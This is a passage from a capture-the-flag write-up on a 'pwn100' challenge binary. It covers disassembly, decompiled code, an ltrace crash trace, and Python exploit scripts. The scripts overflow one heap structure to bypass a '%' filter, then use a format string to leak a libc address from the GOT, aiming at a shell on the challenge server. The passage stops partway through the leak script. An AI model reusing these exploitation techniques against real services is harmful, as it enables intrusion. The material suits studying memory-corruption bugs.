</span><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>objdump -d -M intel --no-show-raw-insn ./pwn100 &gt; pwn100.out
</span></code></pre></td></tr></table></div></figure>


<p>Running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>./pwn100
</span><span class='line'>INPUT1
</span><span class='line'><span class="nv">INPUT2</span>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 1
</span><span class='line'>INPUT1
</span><span class='line'>
</span><span class='line'>T2Verify 1
</span><span class='line'><span class="nv">INPUT2</span>
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 1
</span><span class='line'>INPUT1
</span><span class='line'>
</span><span class='line'>T2Verify 1
</span><span class='line'>INPUT2
</span><span class='line'>...etc...
</span></code></pre></td></tr></table></div></figure>


<p>It doesn&rsquo;t do a whole lot, it takes two strings as input and then starts looping. Superkojiman and I quickly realized we could crash this C++ application by sending more than 300 bytes as input. However, this made it crash in <code>strlen</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*300+&quot;\n&quot;+&quot;B&quot;*300+&quot;\n&quot;&#39;</span> <span class="p">|</span> ltrace ./pwn100
</span><span class='line'>__libc_start_main<span class="o">(</span>0x8048747, 1, 0xffbfc5c4, 0x8048c20, 0x8048c90 &lt;unfinished ...&gt;
</span><span class='line'>_ZNSt8ios_base4InitC1Ev<span class="o">(</span>0x804a054, 0xf77975e0, 0, 0xf76a7ff4, 0xf77560d0<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>__cxa_atexit<span class="o">(</span>0x80485d0, 0x804a054, 0x804a044, 0xf76a7ff4, 0xf77560d0<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>malloc<span class="o">(</span>10240<span class="o">)</span>                                    <span class="o">=</span> 0x081af008
</span><span class='line'>memset<span class="o">(</span>0xffbfc10c, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfc10c
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 603
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>...<span class="o">)</span>    <span class="o">=</span> 603
</span><span class='line'>memset<span class="o">(</span>0xffbfc10c, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfc10c
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, <span class="s2">&quot;&quot;</span>, 1024<span class="o">)</span>                                <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>memset<span class="o">(</span>0x081af020, <span class="s1">&#39;\000&#39;</span>, 0<span class="o">)</span>                    <span class="o">=</span> 0x081af020
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>memcpy<span class="o">(</span>0x081af020, <span class="s2">&quot;&quot;</span>, 0<span class="o">)</span>                        <span class="o">=</span> 0x081af020
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;========\n&quot;</span>, <span class="nv">9</span><span class="o">========</span>
</span><span class='line'><span class="o">)</span>                        <span class="o">=</span> 9
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;T1&quot;</span>, 2T1<span class="o">)</span>                                <span class="o">=</span> 2
</span><span class='line'>memset<span class="o">(</span>0xffbfb8dc, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfb8dc
</span><span class='line'>sprintf<span class="o">(</span><span class="s2">&quot;Verify 0\n&quot;</span>, <span class="s2">&quot;Verify %x\n&quot;</span>, 0<span class="o">)</span>          <span class="o">=</span> 9
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Verify 0\n&quot;</span>, 20Verify 0
</span><span class='line'><span class="o">)</span>                       <span class="o">=</span> 20
</span><span class='line'>memset<span class="o">(</span>0xffbfb8dc, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfb8dc
</span><span class='line'>strlen<span class="o">(</span>NULL &lt;unfinished ...&gt;
</span><span class='line'>--- SIGSEGV <span class="o">(</span>Segmentation fault<span class="o">)</span> ---
</span><span class='line'>+++ killed by SIGSEGV +++
</span></code></pre></td></tr></table></div></figure>


<p>This is unfortunate. It actually combined our inputs and then decided to crash via a null pointer in <code>strlen</code>. We started investigating the binary in more detail. It fills two &ldquo;Tag&rdquo; structures on the heap with our input:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">Tag</span><span class="o">::</span><span class="n">set_tag_content</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="kt">int</span> <span class="o">*</span> <span class="n">arg_0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">eax</span> <span class="o">&lt;=</span> <span class="mh">0x201</span><span class="p">)</span> <span class="k">goto</span> <span class="n">loc_8048976</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a40</span><span class="p">:</span>
</span><span class='line'>    <span class="n">esp</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">;</span>
</span><span class='line'>    <span class="n">ebx</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="mi">2047</span><span class="p">];</span>
</span><span class='line'>    <span class="n">ebp</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="mi">2046</span><span class="p">];</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">eax</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048976</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">stack</span><span class="p">[</span><span class="mi">2047</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">=</span> <span class="n">Mem</span><span class="o">::</span><span class="n">get_mem</span><span class="p">(</span><span class="mh">0x804a04c</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">eax</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">arg_4</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span> <span class="n">copied</span> <span class="n">to</span> <span class="n">heap</span><span class="o">?</span>
</span><span class='line'>    <span class="n">var_C</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a14</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a14</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">var_C</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">))</span> <span class="k">goto</span> <span class="n">loc_80489ef</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a26</span><span class="p">:</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">var_C</span> <span class="o">==</span> <span class="n">eax</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">eax</span> <span class="o">=</span> <span class="n">arg_0</span><span class="p">;</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="kt">int16_t</span> <span class="o">*</span><span class="p">)</span><span class="n">eax</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a40</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_80489ef</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">LOBYTE</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_4</span> <span class="o">+</span> <span class="n">var_C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">!=</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x8048cb1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="k">goto</span> <span class="n">loc_8048a10</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a06</span><span class="p">:</span>
</span><span class='line'>    <span class="o">*</span><span class="p">(</span><span class="kt">int16_t</span> <span class="o">*</span><span class="p">)</span><span class="n">arg_0</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a26</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a10</span><span class="p">:</span>
</span><span class='line'>    <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a14</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It checks the length of the input to be less than or equal to 0x201 or 513 bytes. If it is larger, the structure on the heap is not filled (hence our crash in <code>strlen()</code>). The code at <code>loc_80489ef</code> checks our input for the <code>%</code> character&hellip; This hinted at a format string vulnerability!</p>

<p>If there is no <code>%</code> character present, a flag in the structure on the heap will be set to <code>1</code>. If not, the flag will be <code>0</code>. This value is later checked and the binary will print:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>./pwn100
</span><span class='line'>%%
</span><span class='line'><span class="nv">AA</span>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>%%
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span></code></pre></td></tr></table></div></figure>


<p>I call this flag &ldquo;Tag::verify&rdquo;. I started playing around with the input and I was able to overwrite the verify flag of Tag2 using a buffer overflow in Tag1:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>%
</span><span class='line'>%p
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>%
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span><span class='line
</span><span class='line'>T2Verify a
</span><span class='line'>%p
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span></code></pre></td></tr></table></div></figure>


<p>First, I sent an invalid Tag1 and Tag2 buffer, containing a <code>%</code> character. Then I get the option to send another input for Tag1. I submit 512*<code>1</code> plus a newline (which is <code>a</code> in hexadecimal). The newline ends up in Tag2::verify!</p>

<p>This means we can bypass the verification by overflowing Tag1 into Tag2::verify. I started a <code>socat</code> listener and started experimenting in a python script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>socat TCP-LISTEN:6666,fork EXEC:./pwn100
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The offsets are taken from the output of <code>nm -D ./libc.so.6 | grep &lt;function_name&gt;</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'>
</span><span class='line'>00000400-083cb214-00000000-00000000-00000000-30303030
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>It works! We can bypass the string format protection by overflowing Tag1 into Tag2. Now things become interesting. We need a way to spawn a shell, so we need <code>system()</code>. However, ASLR is probably enabled, so we need to leak a libc address somehow. We can easily leak addresses with the string format vulnerability. Let&rsquo;s run it against the super slow remote server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;lab33.wargame.whitehat.vn&#39;</span><span class="p">,</span> <span class="mi">10100</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="c"># leak write@got</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a01c</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%6$s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># first, enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># receive crap from format string</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>   
</span><span class='line'>  <span class="c"># receive actual information, contains leaked got pointers</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> 
